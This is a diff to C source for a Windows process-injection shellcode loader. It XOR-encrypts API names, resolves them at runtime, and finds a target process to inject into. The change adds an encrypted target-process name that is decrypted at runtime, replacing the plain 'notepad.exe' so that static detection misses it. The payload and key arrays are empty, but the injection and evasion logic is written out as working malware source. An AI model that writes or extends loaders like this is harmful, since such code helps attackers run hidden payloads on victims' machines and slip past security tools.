@@ -10,6 +10,9 @@
 // shellcode - 64-bit
 unsigned char my_payload[] = { };
 
+// encrypted process name
+unsigned char my_proc[] = { };
+
 // encrypted functions
 unsigned char s_vaex[] = { };
 unsigned char s_cth[] = { };
@@ -22,6 +25,7 @@ unsigned char s_p32n[] = { };
 
 // length
 unsigned int my_payload_len = sizeof(my_payload);
+unsigned int my_proc_len = sizeof(my_proc);
 unsigned int s_vaex_len = sizeof(s_vaex);
 unsigned int s_cth_len = sizeof(s_cth);
 unsigned int s_wfso_len = sizeof(s_wfso);
@@ -31,7 +35,9 @@ unsigned int s_clh_len = sizeof(s_clh);
 unsigned int s_p32f_len = sizeof(s_p32f);
 unsigned int s_p32n_len = sizeof(s_p32n);
 
+// keys
 char my_payload_key[] = "";
+char my_proc_key[] = "";
 char f_key[] = "";
 
 LPVOID (WINAPI * pVirtualAllocEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);
@@ -147,7 +153,10 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
     XOR((char *) s_clh, s_clh_len, f_key, sizeof(f_key));
     pCloseHandle = GetProcAddress(GetModuleHandle("kernel32.dll"), s_clh);
 
-    pid = FindTarget("notepad.exe");
+    // decrypt process name
+    XOR((char *) my_proc, my_proc_len, my_proc_key, sizeof(my_proc_key));
+
+    pid = FindTarget(my_proc);
 
     if (pid) {
         // decrypt OpenProcess function call
